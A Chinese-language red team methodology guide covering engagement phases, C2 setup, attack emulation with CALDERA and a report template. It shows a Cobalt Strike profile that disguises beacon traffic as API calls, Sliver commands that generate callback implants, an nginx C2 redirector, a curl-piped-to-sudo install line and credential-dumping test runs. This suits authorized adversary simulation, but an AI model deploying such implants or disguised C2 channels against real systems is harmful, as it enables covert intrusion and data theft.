---
id: 24-001
title: "🔴 红队评估方法论 (Red Team Assessment)"
category: 红蓝对抗
category_en: "Red/Blue Team"
difficulty: ★★★★★
tools: "Cobalt Strike, CALDERA, Sliver, Nighthawk, Mythic"
last_updated: 2025-07
tags: ["red-team", "blue-team", "purple-team", "bas", "adversary-simulation"]
subdomain: red-blue-team
nist_csf: ["DE.AE-02", "RS.AN-01", "ID.RM-01"]
mitre_attack: ["T1595", "T1562"]
---
# 🔴 红队评估方法论 (Red Team Assessment)

## 概述

红队评估通过模拟真实攻击者的TTP（战术、技术和流程），全面测试组织的检测响应能力。红队评估超越传统渗透测试，以攻击场景为目标，评估整体安全防御体系的有效性。

## 核心技能

### 1. 红队评估框架

```python
# 红队评估流程框架
red_team_framework = {
    "phase_1_targeting": {
        "description": "目标选择与情报收集",
        "activities": [
            "客户目标明确",
            "OSINT情报收集",
            "攻击面分析",
            "规则设定（Scope/Rules of Engagement）"
        ],
        "deliverables": ["目标分析报告", "ROE文档"]
    },
    "phase_2_initial_access": {
        "description": "初始访问",
        "activities": [
            "社会工程学攻击",
            "漏洞利用",
            "凭证喷洒",
            "供应链攻击"
        ],
        "deliverables": ["访问时间线", "攻击树图"]
    },
    "phase_3_lateral_movement": {
        "description": "横向移动与特权提升",
        "activities": [
            "内网探测",
            "凭证窃取",
            "AD攻击",
            "云环境横向移动"
        ],
        "deliverables": ["网络拓扑", "权限映射"]
    },
    "phase_4_mission_accomplishment": {
        "description": "达成目标",
        "activities": [
            "数据窃取",
            "系统破坏",
            "持续控制",
            "影响证明"
        ],
        "deliverables": ["目标达成证明(PoC)", "时间线分析"]
    },
    "phase_5_debrief": {
        "description": "报告与改进",
        "activities": [
            "发现汇总",
            "蓝队反馈",
            "防御改进建议",
            "检测规则优化"
        ],
        "deliverables": ["总报告", "检测规则包", "改进路线图"]
    }
}
```

### 2. C2基础设施部署

```bash
# Cobalt Strike 团队服务器部署与配置
# 团队服务器启动
./teamserver <server_ip> <password> [/path/to/profile.profile]

# Malleable C2 Profile - 伪装流量特征
cat << 'EOF' > myprofile.profile
http-get {
    set uri "/api/v1/health";
    client {
        header "Accept" "application/json, text/plain, */*";
        header "X-Requested-With" "XMLHttpRequest";
        metadata {
            prepend "session=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            base64;
            print;
        }
    }
}

http-post {
    set uri "/api/v1/data";
    client {
        header "Accept" "application/json";
        header "X-Requested-With" "XMLHttpRequest";
        id {
            prepend "user=";
            header "Authorization";
        }
        output {
            base64;
            print;
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            base64;
            print;
        }
    }
}

http-stager {
    set uri_x86 "/api/v1/init";
    set uri_x64 "/api/v1/init64";
}
EOF

# Sliver C2 部署
# 安装
curl https://sliver.sh/install | sudo bash
# 启动服务端
sliver-server
# 生成监听器
sliver > https --ip 192.168.1.100 --port 443 --domain cdn.cloud-provider.com
# 生成植入物
sliver > generate --mtls 192.168.1.100 --save beacon.exe --os windows
sliver > generate beacon --http 192.168.1.100 --save beacon.sh --os linux

# 使用重定向器/跳板机
# Nginx反向代理到C2
cat << 'EOF' > /etc/nginx/sites-available/c2-redirector
server {
    listen 443 ssl http2;
    server_name api.cloud-service.com;
    
    location / {
        proxy_pass https://real-c2-server:443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_ssl_verify off;
        proxy_ssl_session_reuse on;
    }
}
EOF
```

### 3. 攻击模拟自动化 (CALDERA)

```bash
# CALDERA 安装与配置
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip install -r requirements.txt

# 启动CALDERA
python server.py --insecure

# 默认登录: admin / admin
# 访问: http://localhost:8888

# 使用CALDERA API创建红队行动
curl -X POST -H "Content-Type: application/json" \
  -u admin:admin \
  -d '{
    "name": "模拟APT29攻击流",
    "group": "red",
    "planner": {"id": "atomic"},
    "objective": {"id": "495a982a-3c08-488c-89e6-6bc0e1c81838"},
    "adversary": {"adversary_id": "e6b2f2fc-4f7d-42b1-8a4a-2602b2e2c8e7"}
  }' \
  http://localhost:8888/api/v2/operations

# 使用Atomic Red Team独立运行测试
Invoke-AtomicTest T1059.001 -ShowDetails # PowerShell
Invoke-AtomicTest T1566.001 -CleanUp      # 清理

# 批量执行MITRE ATT&CK技术
$techniques = @("T1059.001", "T1059.003", "T1053.005", "T1003.001")
foreach ($t in $techniques) {
    Invoke-AtomicTest $t -GetPrereqs
    Invoke-AtomicTest $t
}
```

### 4. 红队报告与客户沟通

```markdown
# 红队评估执行摘要（模板）

## 评估概览
- **客户**: XXX科技
- **周期**: 2025年7月1日 - 2025年7月15日
- **目标**: 获取核心业务系统(CRM)数据访问权限
- **总体评级**: 🟡 中等风险

## 关键发现
| # | 发现 | 严重程度 | MITRE ATT&CK |
|:---:|:---|:---:|:---:|
| 1 | 钓鱼邮件获取初始访问 | 🔴 严重 | T1566.001 |
| 2 | AD域提权 (NoPac) | 🔴 严重 | T1068 |
| 3 | SMB共享凭证明文存储 | 🟠 高危 | T1552.001 |
| 4 | 未启用MFA → 凭证喷洒成功 | 🟠 高危 | T1110.003 |

## 攻击路径摘要
1. **初始访问** (Day 1): 发送钓鱼邮件 → 1名员工点击 → 获取内网入口
2. **横向移动** (Day 2-3): LDAP枚举 → 获取域管理员凭证
3. **特权提升** (Day 3): NoPac漏洞利用 (CVE-2021-42278/42287)
4. **目标达成** (Day 4): CRM数据库访问 → 10万+条客户记录

## 发现的检测盲区
- [ ] 没有检测到 PowerShell 远程下载（T1059.001）
- [ ] LDAP 枚举未触发告警（T1482）
- [ ] SMB 哈希中继未被阻断（T1557.001）

## 建议措施（按优先级）
1. 🔴 **立即**: 实施MFA（所有外网访问）
2. 🔴 **24小时内**: 修补AD域漏洞 (CVE-2021-42278/42287)
3. 🟠 **一周内**: 部署EDR并启用PowerShell日志记录
4. 🟠 **两周内**: 清理共享文件夹中的敏感文件
5. 🟡 **一个月内**: 建立红队评估常态化机制
```

### 5. 红队工具技术对比

| 工具 | 平台 | C2协议 | 隐蔽性 | EDR逃逸 | 许可证 |
|:---|:---:|:---:|:---:|:---:|:---:|
| Cobalt Strike | Windows | HTTP/HTTPS/DNS/SMB | ⭐⭐⭐ | ⭐⭐⭐ | 商业 |
| Sliver | Win/Lin/Mac | mTLS/HTTP/DNS | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | 开源 |
| CALDERA | Win/Lin | HTTP/HTTPS | ⭐⭐ | ⭐⭐ | 开源 |
| Mythic | Win/Lin | WebSocket/HTTP | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | 开源 |
| Nighthawk | Windows | HTTPS/DNS | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 商业 |
| Havoc | Win/Lin | HTTP/HTTPS/SMB | ⭐⭐⭐⭐ | ⭐⭐⭐ | 开源 |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Cobalt Strike | 商业红队C2框架 | https://www.cobaltstrike.com/ |
| CALDERA | MITRE自动化攻防平台 | https://caldera.mitre.org/ |
| Sliver | 开源C2框架 | https://github.com/BishopFox/sliver |
| Mythic | 多代理C2框架 | https://github.com/its-a-feature/Mythic |
| Atomic Red Team | 原子测试库 | https://atomicredteam.io/ |

## 参考资源

- [MITRE ATT&CK® Framework](https://attack.mitre.org/)
- [Red Team Assessment Methodology — CISA](https://www.cisa.gov/red-team)
- [CREST Penetration Testing Guide](https://www.crest-approved.org/)
- [SANS Red Team Operations](https://www.sans.org/cyber-security-courses/red-team-operations/)
- [PTES — Penetration Testing Execution Standard](http://www.pentest-standard.org/)
